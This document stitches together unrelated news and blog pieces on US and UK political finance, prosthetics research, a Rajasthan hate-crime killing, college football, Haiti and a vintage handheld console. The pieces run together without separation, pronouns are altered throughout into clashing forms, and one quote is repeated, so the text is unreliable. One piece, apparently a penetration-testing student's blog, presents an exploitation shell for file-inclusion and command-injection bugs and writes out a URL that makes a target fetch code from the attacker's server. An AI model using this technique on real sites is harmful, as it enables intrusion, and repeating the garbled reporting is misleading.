If the Kochs hit their $889 million goal, it would more than double the $407 million raised by the brothers' network during the previous presidential cycle. After all that spending failed to produce major gains for the GOP in 2012, donors were left scratching their heads—and blaming the Republican Party's field of candidates, including presidential nominee Mitt Romney. But in the recent midterm elections, the Koch network reportedly set a $290 million target and ultimately fared far better, propelling conservative stalwarts, such as Iowa's Joni Ernst and Arkansas' Tom Cotton, to victory and helping the GOP retake control of the US Senate.
“If you're going to play in this arena, you don't play only when it's lukewarm, you play when it gets hot, too, and it's gotten hot,” says a friend of the Kochs. “They're still playing.”
Now more than ever, elected officials, especially politicians with presidential aspirations, covet an invitation to appear at a Koch donor retreat. New Jersey Gov. Chris Christie spoke at the Kochs' June 2011 event in Vail, Colorado. In their introduction of Christie, David Koch described the governor as “my kind of guy.” Ernst, a self-described “little-known state senator from a very rural part of Iowa” then running for US Senate, appeared at the Kochs' summer 2014 retreat, and they thanked the people in attendance for helping drive their ascent, according to leaked audio of their remarks. “The exposure to this group and to this network and the opportunity to meet so many of you,” they said, “that really started my trajectory.”
At the most recent retreat, Wisconsin Gov. Scott Walker made an appearance, as did Sens. Marco Rubio (R-Fla.), Rand Paul (R-Ky.), and Ted Cruz (R-Texas). The three senators and possible GOP presidential contenders appeared together on a panel, moderated by ABC News' Jonathan Karl and livestreamed to members of the media, and discussed domestic and foreign policy issues.
The Kochs surprised many with their decision to livestream the panel. In the past year, the notoriously private Kochs have tiptoed their way toward being more transparent about their plans. (The sources of their funding, however, will continue to remain mostly anonymous.) Freedom Partners, the group overseeing the Koch seminars, launched a super-PAC in 2014 that discloses all of its donors, and the brothers themselves and their top aides have recently given interviews to reveal some of their thinking.
If the Kochs hit their $889 million target, they will essentially function as a third party in US politics, and they can expect far greater scrutiny and criticism as their operation continues to grow. But those close to the brothers and their network do not expect them to be spooked by even more attention. “If you're going to play in this arena, you don't play only when it's lukewarm, you play when it gets hot, too, and it's gotten hot,” Nestor Weigand, a friend of Charles Koch and Freedom Partners board member, told Mother Jones editor and Koch biographer Daniel Schulman. “They're still playing.”
A recent Quinnipiac University poll has Donald Trump caught up with Hilary Clinton in some key industrial states, including Ohio and Pennsylvania. While the pundits have had a field day analyzing why he's doing better than expected there, I feel like we keep missing a key point. It's still the economy, stupid.
We've talked a lot about the "working class" in this election - mostly in terms of demographics such as gender and race. As a friend of mine said recently, though, the key to that phrase is the word "working." He's right. "Working" is the identity a broad base of people are trying to preserve, and which feels under threat.
It feels under threat because it is. For far too much of America - today's diverse America as well as yesterday's more white male version - work is just plain going away. Or, the investment required to get good work - in education, extracurricular involvement, advanced social networks, etc. - is too far out of reach. You're stuck and there's no way up, or out.
According to a recent report by the Pew Research Center, America's middle class is getting squeezed. Some people are becoming upper class, and others are getting stuck in the lower income tiers. While general middle class decline is happening everywhere, want to know who's moving disproportionately to the lower tiers? People who live in former working class communities and parts of the country that haven't cornered a piece of the "knowledge economy."
As Pew put it, "The economies...with the greatest losses in income status from 2000 to 2014 shared a greater-than-average reliance on manufacturing." Rocky Mountain, NC lost 10% of its middle income families to the lower income bracket. For Jackson, MI and Springfield, OH it was 14% and 16% respectively. In a place like Massachusetts, however, knowledge hub of the East Coast, people are moving up. In "Boston-Cambridge-Newton," median household income sat at just under $80,000.
There's not a new job waiting in the communities who are losing. And for families working two or three jobs to break even, no amount of compounded savings is going to bring relief, no comfortable retirement is going to bring rest. That's your life today, tomorrow and every day. That's a very, very hard place to be.
Angry "working class" voters - whether they've followed Donald Trump or Bernie Sanders -- rightly see an American economic future that threatens not to include them, either in work, or in economic supports for people who will be left out of the future workforce. They also see a culture that used to celebrate them but no longer does. Gone are the days of John Lennon's "Working Class Hero" or composer Aaron Copeland's, "Fanfare for the Common Man." Today, we celebrate Zuckerberg and Gates. Today, it seems like dignity is in being a "tech bro," but not in being a truck driver.
This isn't just a practical issue. It's also a moral one. Work is fundamental to human dignity. We can't just curate growth and profitability in our economy. We also must curate real work for everyone, across race and gender.
Electoral Commission fines Peter Harris, who spent £420,000, for failing to deliver spending return and audit report on time
The owner of Butlins, Peter Harris, has received a record fine from the Electoral Commission for breaking spending return rules.
The Electoral Commission imposed the £12,000 fine on Harris, who spent more than £420,000 campaigning for a leave vote in last year's EU referendum, for failing to deliver their spending return and audit report on time.
The money was spent on full-page colour advertisements in the Daily Mail and the Sun in the week prior to the referendum vote that took place on 23 June 2016.
The ad campaign featured a bulldog wearing a tie with the union flag on it. Slogans included: “Let's be the top dog again – vote” and: “You would be barking not to vote – this is our chance to leave the European Union.”
At the time their spokesperson told the Daily Express: “It's all very well to say you want Brexit, but you've got to do something about it.”
Facebook Twitter Pinterest The EU referendum advertisement that appeared in the Daily Mail on 15 June 2016.
It is an offence not to deliver a spending return and audit report by the due date where a campaigner has spent more than £250,000.
The commission said that after being advised of the investigation Harris reported spending of £421,432.64 and supplied an audit report.
Separately, the Democratic Unionist party was required to pay a £4,000 fine from the Electoral Commission after errors were found in its spending return for the 2016 Northern Ireland assembly election. The party filed payments totalling £49,184 as party spend as opposed to individual candidate expenditure.
However, the commission, which oversees elections and regulates political finance in the UK, said it was satisfied that the individual politicians had reported the payments correctly and that their inclusion in the party's return was a duplication.
The party also omitted to report two payments of £397.50 that should have been reported to the commission.
The party has informed the commission that it has reviewed its procedures to prevent a recurrence of these errors.
A DUP spokesperson told the Press Association that “administrative errors” had led to the election spend being recorded as higher than it should have been. “This error was corrected in an amended campaign expenditure return,” they said.
“The party has put in place new processes to guard against this in future.”
There's hope for a better life for people who've lost an arm or leg, thanks to new research funded by the National Science Foundation and the Department of Defense.
George Mason University researchers are developing cutting-edge ultrasound technology to help people get greater control of prosthetics for their arms, hands, and legs.
"Our goal is to help amputees go about their daily lives with improved function," says Siddhartha Sikdar, an associate professor in the Department of Bioengineering at Mason Engineering. Sikdar has launched a pilot feasibility study with amputees who are using a new ultrasound-based system.
Currently, upper-body extremity prostheses (arm and hand) usually are controlled by an electrical method that senses muscle activity, they say. Electrodes on the skin surface pick up the electrical activity of muscles in the residual limb as the amputee attempts to perform movements.
The problem is that electrodes at the skin surface cannot readily differentiate between the signals from the many different muscles in the forearm that control the fingers and thumb.
Amputees often get discouraged by the limitations of this method, and one study showed about half don't use their expensive prostheses because the artificial limbs don't improve their quality of life, Sikdar says.
"It's really a shame because modern prosthetic hands are sophisticated systems," they say. "The biggest challenge has been to provide users with a reliable, noninvasive, and intuitive method to control these devices."
Sikdar's team has been investigating a new way of operating prostheses by using ultrasound waves to sense muscle activity. The research is funded by two $1 million grants, one from the National Science Foundation and one from the Department of Defense.
The team is designing and evaluating miniaturized ultrasound transducers, which are compact devices worn as a small band on the forearm or under the prosthetic shell.
The transducer sends sound waves into the body and senses the reflected sound waves. Then these signals are analyzed using computer algorithms to recognize muscle activity.
This method is able to sense muscle activity deep inside the tissue, and it differentiates between different muscle groups much better than electrodes on the surface of the skin.
Their laboratory research suggests that the ultrasound method allows for much dexterity in controlling upper body prosthetics, including fine-tuned motor control of the fingers and thumb, Sikdar says.
In the lab, they have shown that computer algorithms can use this ultrasound method to learn to accurately differentiate between 15 distinct hand and wrist movements. Users can robustly perform partial movements with high degree of control. "The military is funding this technology as a way to improve the lives of those who have been wounded in action," they say.
In another project, funded by the National Science Foundation, Sikdar's team is applying the ultrasound-based method for sensing muscle activity to develop new types of exoskeletons for people with spinal cord injuries.
They are also exploring several other areas of this research including developing simpler, less expensive upper-body extremity prosthetics; extending the ultrasound-based control methods to lower-limb prostheses; and training people to use the prosthetics by means of video games.
Sikdar has applied for patents on the work and is looking for ways to commercialize it if the latest research proves successful.
Eventually, these developments may help not only amputees in the United States but around the world. "Knowing that this technology can potentially help real people keeps us all highly motivated," they say.
Recently, I received some inspiration while working on my OSCP labs. Since a variety of automated tools are restricted from use during the actual exam, I wanted to avoid using them as much as possible. Manual exploitation can sometimes be tedious, and whenever I am faced with tedious work I start writing code! It seemed that every new box I faced in the labs gave me another idea to add, and what started as a few simple python scripts quickly turned into a relatively nicely featured exploitation shell which can be used to ease the process of exploiting LFI, RFI, and command injection targets.
Now that my labs are finished, I thought maybe other people could find this as useful as I have, so I decided to open source my tool. Enter: shellfire!
It won't automatically identify vulnerabilities at the moment, but it does make your job easier when exploiting them.
You can grab the code from Github. It's just python (tested with 2.7) so it should run in quite a few places.
How does it work?
I'm glad you asked! Let's take a quick look at how to use shellfire for exploiting a vulnerable site.
For this example, we are going to look at a simple fake website running on my local machine that is vulnerable to RFI. I open up the site in Safari to poke around a bit.
Clicking around, we notice the URL on the news page looks suspicious.
I'm not going to tread deep into the woods on determining what parameters are exploitable (that's a topic for another article), but let's say you fiddled with the path variable a bit and have determined that it's vulnerable to RFI. Huzzah! Let's fire up shellfire!
We can just launch shellfire using python (or set it executable and launch it directly). Something like python shellfire.py should do.
Once started, you will be dropped into the interactive shell. Similar to sqlite3, you preface shellfire commands with a dot. Anything else will be sent to your target. You can type .help at any time for a list of available commands, or append the command you want to know more information about to help for specific details. For example .help http .
Since this is an RFI, we are going to need to host our exploit code somewhere for the vulnerable target to include. Fortunately, shellfire supports a built-in web server to do this! (At the moment, this web server only serves PHP exploit code, but it should be trivial to add additional target languages in the future.)
We just type the following in our shell and our web server will start up on its default port 8888 (of course you can change this if you wish, just check out the help screen for information on how):
>> .http start
Finally, we just need to tell shellfire what the target we are going to exploit is. In this case, we enter the URL for our vulnerable site, but replace the value of our vulnerable path variable with the address of our shellfire exploit web server:
>> .url http://vuln.tld/?path=http://127.0.0.1:8888/
That's it! We can now issue commands to this box as you would with any shell. Shellfire will take care of sanitizing your input and encoding it for the target.
These aren't the only features, either. Shellfire supports SSL, posting cookies, using the POST method, and more. I hope you all find this useful! And thanks to Offensive-Security for inspiring me to write this!
Shambhu Lal Regar wanted to kill another man but ended up hacking to death a 48-year-old migrant labourer in Rajsamand on December 6, police said on Monday.
The murder sparked nationwide outrage and stirred communal tension in several areas of Rajasthan after Regar uploaded a video of the gruesome crime on the social media and several other clips in which they made inflammatory religious remarks.
During grilling, Shambhul told police that labourer Mohammed Afrazul, a resident of West Bengal's Malda, was not their target.
“He wanted to kill one Ajju Sheikh because they were in contact with a girl whom Shambhu regarded as their sister. But we suspect Shambhu had an affair with her,” said Rajendra Singh Rao, police circle officer of Rajsamand.
Ajju, too, was a labourer like Afrazul from Malda and used to work in Rajsamand. Shambhu had only spoken to Ajju on phone and did not recognise him, the police officer said.
Having resolved to kill him, Shambhu went to a market at Jhalchakki and enquired about Ajju. When they couldn't find Ajju, they asked one labourer for their mobile number.
“Either the labourer misheard Shambhu, or they thought that since Shambhu needs to get some work done, why not help Afrazul, probably their acquaintance, get some work. They then gave Afrazul's number to Shambhu,” Rao said.
Shambhu called Afrazul on December 5 and did not bother to confirm their identity as they found their voice similar to that of Ajju.
“That day Afrazul was in Nathdwara. On December 6, they called Afrazul at 9 am again and asked them to come as they wanted a boundary wall of a plot constructed,” the police officer said.
At around 10:30 am they had tea with Afrazul at a teashop about a kilometre from the spot where Afrazul was killed.
Their presence secured, police said, Shambhu then left for their home from where they got the pickaxe and other tools with which they hacked Afrazul. They also got their nephew with them this time to record the act on camera.
The girl supposedly at the centre of the hate crime lives in Regar Mohalla, the same locality as Shambhu's. Shambhu said in one of the videos that they considered the girl as sister, but according to some accounts they had a love affair with the girl.
The girl had allegedly eloped with a migrant labourer Mohammed Bablu Sheikh to Malda in 2010. Them mother and uncle went to Malda and brought them back from the place but they were taken to Malda again after a couple of months, allegedly by Ajju.
“It was Ajju who took them back, Shambhu said, and when they called the girl after that incident, Ajju took the phone from them and the two men had a brawl,” Rao said.
In 2012, when the girl's mother was lamenting that there was no one to bring their girl back, Shambhu volunteered to bring the girl back from Malda.
“He came to take me back but I told them to go back. I returned on my own, about 15 days after their visit. Despite that they took ₹10,000 from my mother for ‘rescuing' me,” the girl earlier told HT.
Ajju had visited Beawar in Ajmer 4-5 months ago and met the girl then, police said.
Shambhu learnt about their meeting and was apprehensive that they might take the girl back again and therefore resolved to kill him, police officer Rao said.
Besides, Rao said Shambhu got indoctrinated through hate videos on internet and used to spend hours watching videos on both Hindu and Muslim extremism.
“Revenge from Ajju was their motive, fuelled by their hatred towards Muslims. Shambhu kept saying that Muslims were wrecking the country and that Hindus should awaken,” Rao said.

People Before Profit MLA Eamonn McCann mooted the introduction of a new stalkers' register during a debate in Stormont on Monday.
During the same debate Justice Minister Claire Sugden also said that the enhancement of a special pilot domestic violence court in Derry was one of a number of measures being used to support the predominantely women victims of abuse.
The Minister said: “We are considering a new domestic abuse offence to capture patterns of coercive and controlling behaviour.
“We are also working on enhancing the special court listing arrangements in Derry/Londonderry for domestic violence cases, building on the pilot scheme that is happening here.
“This enhancement will not only improve support services for victims but seek to change the abusive behaviour of perpetrators.”
During the course of the debate, Mr McCann suggested the only way new anti-stalking legislation could be effective would be through the establishment of an official register.
Mr McCann asked: “Will the Minister agree that, in order to be effective, the legislation that they refer to would have to include the introduction of a stalkers register in the manner of the sex offenders register; that stalking cases should be kept open; and that, given recent experience, it ought to be easier for the women victims of stalking - this is largely a gender-specific crime - to obtain legal aid?”
Ms Sugden replied: “I thank the Member for their intervention. If they gave me time to get into the depth of my speech, they would hear that I am minded to thinking in a similar way.”
Speaking after the debate, Derry Sinn Féin Councillor Patricia Logue agreed that effective legislation is needed to combat stalking.
They said: “Stalking is a deeply insidious, invasive, psychological form of criminal abuse, with shocking side effects and consequences for victims.
“Despite that we still do not have a legal definition of stalking or effective legislation.
“Stalking is a breach of human rights and therefore undermines article 8 of the Human Rights Act. Yet here in the North it is not a specific criminal offence.
“Scottish law since 2010 has made stalking a specific criminal offence, and a priority crime. We should follow Scotland's lead.
“Stalking is a crime which has existed for too long beyond the reach of the law in Ireland, north and south.
“This gap in our law should be closed by the Department of Justice and prioritised as an item of all island cooperation.”
COLUMBUS, Ohio -- Ohio State opened training camp on Monday with a practice for freshmen in the morning, and for upperclassmen in the afternoon.
* Updates and photos from Monday morning's freshmen practice
Here's a breakdown of notes from the afternoon practice and what Meyer had to say at the close of the day:
* Meyer said quarterbacks J.T. Barrett and Cardale Jones were quoted "fine" on Monday. So there you have it. Just kidding. Here's everything you need to know about the quarterback battle from Monday.
* It's early, and Meyer is still getting a feel for the first-year student class, but they like linebackers Jerome Baker, Justin Hilliard and Nick Conner. "I can see those three guys contributing in some form," Meyer said.
* Running back Ezekiel Elliott said their left wrist is still recovering, but they don't have full flexibility back and doesn't know if they ever will. But Elliott added that they should be able to carry the ball in their left hand, and use that arm to fend off tacklers this season, something they couldn't do in 2014.
* Meyer confirmed that junior Bri'Onte Dunn is the No. 2 back behind Elliott. Curtis Samuel held that spot last year, but Samuel is transitioning to H-back. Meyer liked what they saw from Samuel on Monday.
"He looked more natural at that position today than they did at first," Meyer said.
* Ohio State will have to find someone to replace Joey Bosa in the opener against Virginia Tech. The first name Meyer mentioned there is redshirt first-year student Sam Hubbard. They also threw out Jalyn Holmes and Darius Slade as potential fill-ins. And this:
"You got a big kid named Josh Perry who can do some things for us if we decide to change things up a bit," Meyer said.
* All four players who were suspended for the opener at Virginia Tech -- Bosa, Corey Smith, Dontre Wilson and Jalin Marshall -- practiced on Monday.
* Braxton Miller was on the field in a red No. 1 jersey. They stretched with the quarterbacks, for whatever that's worth. Miller also worked some on punt returns with Marshall, Wilson and Marshon Lattimore.
Meyer said Miller spent the entirety of the first practice with the receivers.
* Lattimore, who was held out during the spring and missed time last year with a hamstring injury, didn't look like they were held back in any way.
* If you stopped by the afternoon session, you'd think Ohio State had a shortage at tight end. The only players out working with position coach Tim Hinton were senior Nick Vannett and redshirt sophomore Marcus Baugh. But there are more bodies there, freshmen Rashod Berry and A.J. Alexander worked out at tight end during the morning period.
Australia's co-operation with Sri Lanka has been seriously questioned in a new report by international human rights lawyers, who say that it is deeply flawed and jeopardises asylum seekers' attempts to seek safety.
The report by the Human Rights Law Centre condemns Australia's ''stopping the boats'' policy in Sri Lanka where asylum seekers are often sent back to Sri Lankan militaries, the authorities they are fleeing from.

The Abbott government last year gave the Sri Lankan navy two Bay-class patrol boats, recently retired from surveillance service in Australia, to intercept asylum-seeker boats before they leave Sri Lankan waters.
Australia continually claims that no asylum seekers sent back to Sri Lanka have been harmed, but documents obtained by freedom of information request established at least one instance where Australia received a complaint that a man had been "severely tortured" upon their return from an Australian-run detention centre, the report said.
A Black Agenda Radio commentary by Glen Ford
The horrific squandering of Haitian lives and earthquake relief and aid dollars by the occupying powers over the past two years are direct consequences of previous imperial crimes. “Since 2004, Haiti has been methodically stripped of its sovereignty, made into a protectorate of the United Nations,” which is merely a front for the United States. “The earthquake of January 2010 was a natural phenomenon that happened to take place while a rape was in progress.”
Haiti, Raped by the U.S. Since 2004, and Still Bleeding
A Black Agenda Radio commentary by Glen Ford
“The United States has flexed every superpower muscle to prolong Haiti's agony.”
In the American media, Haiti is most often spoken of as a tragedy – when it is actually the scene of horrific crimes, mainly perpetrated by the United States over the span of two centuries. For the past two years, since the earthquake that shook the life out of hundreds of thousands of already deeply wounded people, the United States has flexed every superpower muscle to prolong Haiti's agony.
Half a million people are still homeless, two years after the quake, despite the billions in relief and recovery aid pledged by international donors. Sixty percent of the rubble has yet to be removed from the capital and its suburbs, and 6,000 people have died from a cholera epidemic brought into the country by United Nations troops. The UN has still not seen fit to apologize for being the vector of disease, because the UN is not accountable to the people of Haiti – only to the United States. The Americans used a huge chunk of their so-called aid money to reimburse themselves for the cost of their military occupation of the country. Dead, dying, sick, starving, homeless Haitians are made to pay for their own imprisonment in their native land, while Washington gloats that it is Haiti's last, the best hope, and that the catastrophic earthquake might have been a good thing, a chance for a “new beginning” under Washington's firm guidance.
Millions were spent to choreograph crooked elections that brought to office a government with no power, even less money, and not a shred of dignity – a puppet regime held in absolute disrespect by its American puppeteers.
“Washington gloats that it is Haiti's last, the best hope, and that the catastrophic earthquake might have been a good thing.”
Meanwhile, Haiti's most popular political party remains, for all official purposes, an outlaw, effectively banned from civic participation. The Haitian people are not allowed to speak. And this is the heart of the crime, from which all the grand and petty assaults on the Haitian nation, flow. This week's anniversary of the killer earthquake is full of morbid statistics on physical destruction, death and disease, but the appalling numbers cannot separate these two years of horror from the crimes that came before: the isolation and armed extortion of Haiti by the United States and Europe following their 1804 victory against French slavery, leaving the Black republic with a debt that was not paid off until the 1940s; the 26 separate invasions of Haiti by the United States from 1849 to 1915, followed by a nearly 20-year occupation that lasted until 1934; and the U.S. overthrow of Haiti's popularly elected president, Jean Bertrand Aristide, in 2004, the 200th anniversary of Haiti's independence. Since 2004, Haiti has been methodically stripped of its sovereignty, made into a protectorate of the United Nations, which is merely a front for the real rulers, the United States and its junior partners, France and Canada.
The earthquake of January 2010 was a natural phenomenon that happened to take place while a rape was in progress. The rapists in Washington take their greatest pleasure in Haiti's degradation. Haiti needs nothing from the United States, except to be left alone, as a free nation in the world, to make friends as it chooses. It is not natural disaster that holds their back, but naked U.S. aggression – because all people have the capacity to rise, unless they are held down by overwhelming force.

The top Republican and Democrat on the House Intelligence Committee hurled salvos at each other on Wednesday, raising partisan tensions over the investigation into Russian meddling in the U.S. election.
In a tweet, the California Democrat questioned what the "holdup" was after the White House denied reports Tuesday that it tried to stop Yates from testifying.
Also Wednesday, Nunes told NBC News that "it appears like the Democrats aren't really serious" about the probe. The California Republican said "we're going to do an investigation with our without" Democrats.
Their statements escalated the fight over the probe into whether Russian hacking was done in collusion with Donald Trump's campaign to help them win the 2016 presidential election. Some Democrats have accused Nunes of trying to undermine the investigation's independence from the White House and called on them to recuse themselves from it.
Nunes has said they see no reason to step aside from the investigation, and House Speaker Paul Ryan has expressed confidence in him. Still, it remains to be seen how the investigation will proceed.
On Friday, Nunes canceled the public hearing that had been set for Tuesday with testimony from fired acting Attorney General Sally Yates, ex-CIA Director John Brennan and former Director of National Intelligence James Clapper. Nunes and White House Press Secretary Sean Spicer denied that the White House had any influence on the decision to cancel the hearing.
Yates warned the White House in January that former National Security Advisor Michael Flynn could be vulnerable to blackmail after they made incorrect statements about their contacts with Sergey Kislyak, the Russian ambassador to the U.S. The next month, Flynn was forced to resign for what the White House said were their contradictory statements to Vice President Mike Pence.
Trump subsequently fired Yates after they told Justice Department lawyers not to defend their first executive order restricting travel from seven Muslim-majority countries.
Schiff on Monday called for Nunes to recuse themselves from "any investigation" into the president's campaign and transition team. Nunes served on the Trump transition team. The California Republican admitted that they met with an unidentified source on the White House grounds to review intelligence reports ahead of their claim that Trump transition members' communications were "incidentally" swept up by U.S. intelligence officials.
A Well-Loved Milton-Bradley Microvision Box (Front)
[ From Milton-Bradley Microvision Box (Front), ca. 1979 ]
Thirty years ago last month, Milton-Bradley released the world's first handheld game console with interchangeable cartridges, the Microvision. As a result, the Microvision was the first handheld “system” in the classic sense: it allowed the user to play numerous arbitrary software titles on a single base console.
As you may have read in my last VC&G post, I recently celebrated this anniversary over at PC World with a slideshow of handheld system history.
It always pains me when I don't have the time to write up an in-depth history of the subject I'm focused on at any given time, so to compensate a bit, I'd like to share some scans of assorted Milton-Bradley Microvision paraphernalia that I've assembled.
Click above to see the front and back of the flier.
[ From Milton-Bradley Microvision Flier, ca. 1979 ]
Seen above is a small, unfolded 5.75″x5.8125″ flier that I acquired when I purchased my Microvision set many years ago. It was in the Microvision retail box I received, so I'm not sure if it came with the console itself, or if the previous owner acquired it through some other means. On the back (which you can see if you click the image above), it describes and provides screenshots of six different Microvision games.
Blockbuster information from back of Milton-Bradley Microvision box
[ From Milton-Bradley Microvision Box (Back), ca. 1979 ]
Above is a snippet from the back of the Microvision retail box. It describes Blockbuster, the Microvision's original pack-in game, which (to my knowledge) was included with every Microvision unit sold in the United States. Notice the Microvision's expansive 16×16 LCD display.
Star Trek: Phaser Strike Cartridge
And last, but not least, is a scan of the front and back of your typical Microvision game cartridge (in this case, Star Trek: Phaser Strike). Each cartridge came with its own built-in controller overlay (a thin, flexible rubbery printed sheet in a hard plastic grid) that defined which buttons did what for the player.
Each cartridge also included its own CPU in addition to the game code in ROM, so the Microvision console itself was merely a dumb LCD receptacle in some respects. As a result, different CPUs powered different games in some instances — probably the first (and last) time that happened in the video game world.
Overall, the Microvision was an odd machine — very obscure, very underrated, and very forgotten at the moment. Hopefully you readers out there can chime in with your own Microvision memories.

Good news for Crimson Tide fans.
Five-star signee Bo Scarbrough is nearing a full return to the lineup, Alabama coach Nick Saban said on Wednesday.
RELATED: Film study: Alabama has a freakish ballcarrier in Scarbrough
The first-year student running back who tore their ACL during a scrimmage in April and was held out the first four games of the season due to an NCAA issue is nearing full strength and could see extensive action before the end of the regular season.
They posted two carries on Oct. 3 during Alabama's win at Georgia.
“Bo's getting better and better every week,” Saban said, according to AL.com. “I see the speed coming back, the burst coming back. The biggest thing is we've got to get them up to speed on knowing what to do and getting them enough reps in practice to get them ready to be able to play in a game, although I do think he's ready to play in a game now. I do think they can make a contribution, and that's coming sometime soon.”
